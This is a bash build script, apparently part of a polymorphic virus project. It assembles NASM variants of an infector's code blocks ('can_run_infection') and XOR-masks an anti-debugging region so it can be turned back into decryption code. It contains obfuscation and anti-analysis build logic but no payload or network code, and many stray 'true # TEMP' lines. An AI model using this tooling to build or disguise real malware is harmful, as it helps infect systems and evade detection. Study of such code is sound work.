#!/bin/bash
set -euo pipefail
PROJECT_FOLDER="$(realpath -- $(dirname -- "${BASH_SOURCE:-$0}")/..)"
WORK_FOLDER="$PROJECT_FOLDER"/build/
mkdir -p "$WORK_FOLDER"

NASM_CMD="nasm"
if [ $# -ne 1 ]; then
	echo "Usage: $0 <nasm args>"
	exit 1
fi
NASM_CMD="$NASM_CMD $1"

declare -a VARIATIONS_LIST=(
	[0]=save_register
	[1]=call_uncipher
	[2]=jmp_program_entry
	[3]=xor_cipher
)

main()
{
	cd "$PROJECT_FOLDER"
	create_main_with_variations_buffer
	create_obfuscation_mains_to_merge
	create_final_main_with_obfuscation
	for VARIATION_NAME in "${VARIATIONS_LIST[@]}"; do
		update_final_main_with_variation "$VARIATION_NAME"
	done
}

create_main_with_variations_buffer()
{
	cp srcs/main.s "$WORK_FOLDER"/main_with_variation_buffers.s
	for VARIATION_NAME in "${VARIATIONS_LIST[@]}"; do
		VARIATION_FILES=(srcs/variations/"$VARIATION_NAME"/*.s)
		REFERENCE_FILE="${VARIATION_FILES[0]}"
		REFERENCE_FILE_NAME=$(basename -s ".s" "$REFERENCE_FILE")
		REFERENCE_FILE_CONTENT=$(cat "$REFERENCE_FILE")
		BEGIN_TOKEN="POLY_$VARIATION_NAME"_begin
		END_TOKEN="POLY_$VARIATION_NAME"_end
		WORK_FILE_NAME="$WORK_FOLDER"/reference_variation_"$VARIATION_NAME"

		perl -0777 -pe "s/"$BEGIN_TOKEN":.*"$END_TOKEN":/$BEGIN_TOKEN:\n$REFERENCE_FILE_CONTENT\n$END_TOKEN:/s" srcs/main.s > "$WORK_FILE_NAME".s
		$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FILE_NAME".o "$WORK_FILE_NAME".s

		start_offset=$(nm "$WORK_FILE_NAME".o | grep "$BEGIN_TOKEN" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
		true # TEMP
		end_offset=$(nm "$WORK_FILE_NAME".o | grep "$END_TOKEN" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
		size=$((end_offset-start_offset))

		count=${#VARIATION_FILES[@]}
		bytes=$(($count*$size))

		sed -i -E -e "s/^poly_"$VARIATION_NAME"_buffer: db 0x00/poly_"$VARIATION_NAME"_buffer: db $(printf '0x00, %.0s' $(seq 1 $bytes))/" -e 's/, \t//' "$WORK_FOLDER"/main_with_variation_buffers.s
	done
}

create_obfuscation_mains_to_merge()
{
	# Create main with one part each
	perl -0777 -pe 's/\.begin_anti_debugging:.*\.end_anti_debugging://s' "$WORK_FOLDER"/main_with_variation_buffers.s > "$WORK_FOLDER"/main_with_only_uncipher.s
	perl -0777 -pe 's/\.begin_uncipher.*\.end_uncipher://s' "$WORK_FOLDER"/main_with_variation_buffers.s > "$WORK_FOLDER"/main_with_only_anti_debugging.s

	$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FOLDER"/main_with_only_uncipher.o "$WORK_FOLDER"/main_with_only_uncipher.s
	$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FOLDER"/main_with_only_anti_debugging.o "$WORK_FOLDER"/main_with_only_anti_debugging.s

	start_offset=$(nm "$WORK_FOLDER"/main_with_only_anti_debugging.o | grep "can_run_infection.begin_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
		true # TEMP
		true # TEMP
	end_offset=$(nm "$WORK_FOLDER"/main_with_only_anti_debugging.o | grep "can_run_infection.end_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	anti_debugging_size=$((end_offset-start_offset))

	start_offset=$(nm "$WORK_FOLDER"/main_with_only_uncipher.o | grep "can_run_infection.begin_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
		true # TEMP
		true # TEMP
		true # TEMP
	end_offset=$(nm "$WORK_FOLDER"/main_with_only_uncipher.o | grep "can_run_infection.end_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	cipher_size=$((end_offset-start_offset))

	# Balance payload sizes and reserve space for magic_key in sources
	if [[ $cipher_size -lt $anti_debugging_size ]]; then
		diff_size=$((anti_debugging_size-cipher_size))
		sed -i -E "s/(\.end_uncipher:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" "$WORK_FOLDER/main_with_only_uncipher.s"

		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $anti_debugging_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_uncipher.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $anti_debugging_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_anti_debugging.s"
	elif [[ $cipher_size -gt $anti_debugging_size ]]; then
		diff_size=$((cipher_size-anti_debugging_size))
		sed -i -E "s/(\.end_anti_debugging:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" "$WORK_FOLDER/main_with_only_anti_debugging.s"

		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_anti_debugging.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_uncipher.s"
	else
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_anti_debugging.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_uncipher.s"
	fi
}

create_final_main_with_obfuscation()
{
	$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FOLDER"/main_with_only_uncipher_balanced.o "$WORK_FOLDER"/main_with_only_uncipher.s && ld -o "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf "$WORK_FOLDER"/main_with_only_uncipher_balanced.o
	$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FOLDER"/main_with_only_anti_debugging_balanced.o "$WORK_FOLDER"/main_with_only_anti_debugging.s && ld -o "$WORK_FOLDER"/main_with_only_anti_debugging_balanced.elf "$WORK_FOLDER"/main_with_only_anti_debugging_balanced.o

	# Start and stop addresses are same for both executables because of balancing
	start_address=$(nm "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | grep "can_run_infection.begin_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/0x\1/')
	stop_address=$(nm "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | grep "can_run_infection.end_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/obase=16;ibase=16;\U\1+1/' | bc | sed 's/^/0x/')

	start_offset=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | head -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1+1/' | bc)
		true # TEMP
		true # TEMP
		true # TEMP
		true # TEMP
	end_offset=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | tail -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)

	# Xor between two code parts
	cat "$WORK_FOLDER"/main_with_only_anti_debugging_balanced.elf | head -c+$end_offset | tail -c+$start_offset > "$WORK_FOLDER"/only_anti_debugging.bin
	cat "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | head -c+$end_offset | tail -c+$start_offset > "$WORK_FOLDER"/only_uncipher.bin
	python3 tools/xor.py "$WORK_FOLDER"/only_anti_debugging.bin "$WORK_FOLDER"/only_uncipher.bin "$WORK_FOLDER"/magic_key.bin

	# Format magic_key and put it inside final source file
	xxd -g1 "$WORK_FOLDER"/magic_key.bin | perl -pe 's/^[0-9a-z]*: ((?:[0-9a-z]{2} )*) .*$/\1/' > "$WORK_FOLDER"/magic_key.s
	perl -i -pe 's/([0-9a-z]{2})/0x\1,/g;s/, $//' "$WORK_FOLDER"/magic_key.s
	sed -i 's/^/db /' "$WORK_FOLDER"/magic_key.s
	cp "$WORK_FOLDER"/main_with_only_anti_debugging.s srcs/final_main.s
	perl -i -pe "s/^magic_key: db 0x00.*$/magic_key: $(cat "$WORK_FOLDER"/magic_key.s)/" srcs/final_main.s
}

update_final_main_with_variation()
{
	VARIATION_NAME="$1"
	VARIATION_SIZE=0
	VARIATION_COUNT=0
	RES_FILE="$WORK_FOLDER"/variation_"$VARIATION_NAME".s
	echo -n > "$RES_FILE"
	for FILE in srcs/variations/"$VARIATION_NAME"/*.s; do
		FILE_NAME=$(basename -s ".s" "$FILE")
		FILE_CONTENT=$(cat "$FILE")
		BEGIN_TOKEN="POLY_$VARIATION_NAME"_begin
		END_TOKEN="POLY_$VARIATION_NAME"_end
		WORK_FILE_NAME="$WORK_FOLDER"/main_variation_"$VARIATION_NAME"_"$FILE_NAME"

		perl -0777 -pe "s/"$BEGIN_TOKEN":.*"$END_TOKEN":/$BEGIN_TOKEN:\n$FILE_CONTENT\n$END_TOKEN:/s" srcs/final_main.s > "$WORK_FILE_NAME".s
		$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FILE_NAME".o "$WORK_FILE_NAME".s

		start_offset=$(nm "$WORK_FILE_NAME".o | grep "$BEGIN_TOKEN" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
		true # TEMP
		true # TEMP
		true # TEMP
		true # TEMP
		true # TEMP
		end_offset=$(nm "$WORK_FILE_NAME".o | grep "$END_TOKEN" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
		size=$((end_offset-start_offset))
		
		if [ $VARIATION_SIZE -eq 0 ]; then
			VARIATION_SIZE=$size
		else
			if [ $VARIATION_SIZE -ne $size ]; then
				echo "Variation size mismatch: $VARIATION_NAME for $FILE. Expected: $VARIATION_SIZE. Got: $size"
				exit 1
			fi
		fi

		ld -o "$WORK_FILE_NAME".elf "$WORK_FILE_NAME".o
		start_address=$(nm "$WORK_FILE_NAME".elf | grep "$BEGIN_TOKEN" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/0x\1/')
		stop_address=$(nm "$WORK_FILE_NAME".elf | grep "$END_TOKEN" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/obase=16;ibase=16;\U\1+1/' | bc | sed 's/^/0x/')

		start_offset=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address "$WORK_FILE_NAME".elf | grep -E "^[0-9a-z].*$BEGIN_TOKEN.*File Offset" | head -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1+1/' | bc)
		true # TEMP
		true # TEMP
		true # TEMP
		true # TEMP
		true # TEMP
		true # TEMP
		end_offset=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address "$WORK_FILE_NAME".elf | grep -E "^[0-9a-z].*$END_TOKEN.*File Offset" | tail -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
		cat "$WORK_FILE_NAME".elf | head -c+$end_offset | tail -c+$start_offset > "$WORK_FILE_NAME".bin

		xxd -g1 "$WORK_FILE_NAME".bin | perl -pe 's/^[0-9a-z]*: ((?:[0-9a-z]{2} )*) .*$/\1/' >> "$RES_FILE"

		VARIATION_COUNT=$((VARIATION_COUNT+1))
	done

	perl -i -pe 's/\n//g' "$RES_FILE"
	perl -i -pe 's/^[0-9a-z]*: ((?:[0-9a-z]{2} )*) .*$/\1/' "$RES_FILE"
	perl -i -pe 's/([0-9a-z]{2})/0x\1,/g;s/, $//' "$RES_FILE"
	sed -i 's/^/db /' "$RES_FILE"

	perl -i -pe "s/^poly_"$VARIATION_NAME"_buffer: db 0x00.*$/poly_"$VARIATION_NAME"_buffer: $(cat "$RES_FILE")/" srcs/final_main.s
	perl -i -pe "s/^poly_"$VARIATION_NAME"_size: dq 0.*$/poly_"$VARIATION_NAME"_size: dq $VARIATION_SIZE/" srcs/final_main.s
	perl -i -pe "s/^poly_"$VARIATION_NAME"_count: dq 0.*$/poly_"$VARIATION_NAME"_count: dq $VARIATION_COUNT/" srcs/final_main.s
}

main "$@"
